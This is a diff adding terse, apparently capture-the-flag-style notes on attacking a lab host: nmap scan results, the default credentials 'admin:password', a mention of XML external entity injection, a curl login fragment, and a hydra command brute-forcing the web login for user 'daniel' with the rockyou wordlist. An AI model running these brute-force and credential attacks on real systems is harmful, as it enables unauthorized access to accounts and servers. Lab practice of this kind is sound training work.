@@ -1,0 +1,28 @@
+
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-08 14:34 GMT
+Nmap scan report for 10.129.95.192
+Host is up (0.074s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+
+
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
+80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
+443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
+
+admin:password
+
+xml 1.0
+XML external entity
+
+Daniel:
+
+ -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' --data-raw 'username=daniel&password=aaaaaa'
+
+hydra -l daniel -P /usr/share/wordlists/rockyou.txt 10.129.95.192 http-post-form "/:username=^USER^&password=^PASS^:Wrong Credentials" -f 
